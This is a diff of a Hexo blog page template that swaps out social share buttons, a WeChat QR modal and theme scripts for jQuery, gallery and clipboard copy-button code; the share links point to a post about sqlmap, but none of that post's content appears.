-        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/" data-title=" Facebook">
-          <i class="icon icon-facebook"></i>
-        </a>
-      </li>
-      <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《sqlmap操作详解(常用备忘录)》 — osword's blog&url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/&via=http://zhzhdoai.github.io" data-title=" Twitter">
-          <i class="icon icon-twitter"></i>
-        </a>
-      </li>
-      <li>
-        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/" data-title=" Google+">
-          <i class="icon icon-google-plus"></i>
-        </a>
-      </li>
-    </ul>
- </div>
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
 
 
-<div class="page-modal wx-share" id="wxShare">
-    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <img src="//api.qrserver.com/v1/create-qr-code/?data=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/" alt="微信分享二维码">
-</div>
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
 
 
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
 
+<!-- clipboard -->
 
-    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
-<script>
-var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
 
-
-</script>
-
-<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
-
-
-<div class="search-panel" id="search-panel">
-    <ul class="search-result" id="search-result"></ul>
-</div>
-<template id="search-tpl">
-<li class="item">
-    <a href="{path}" class="waves-block waves-effect">
-        <div class="title ellipsis" title="{title}">{title}</div>
-        <div class="flex-row flex-middle">
-            <div class="tags ellipsis">
-                {tags}
-            </div>
-            <time class="flex-col time">{date}</time>
-        </div>
-    </a>
-</li>
-</template>
-
-<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
-
-
-
-
-
-
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-
-
-<script>
-(function() {
-    var OriginTitile = document.title, titleTime;
-    document.addEventListener('visibilitychange', function() {
-        if (document.hidden) {
-            document.title = '死鬼去哪里了！';
-            clearTimeout(titleTime);
-        } else {
-            document.title = '(つェ⊂)咦!又好了!';
-            titleTime = setTimeout(function() {
-                document.title = OriginTitile;
-            },2000);
-        }
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
     });
-})();
-</script>
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
 
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
 
 
 </body>
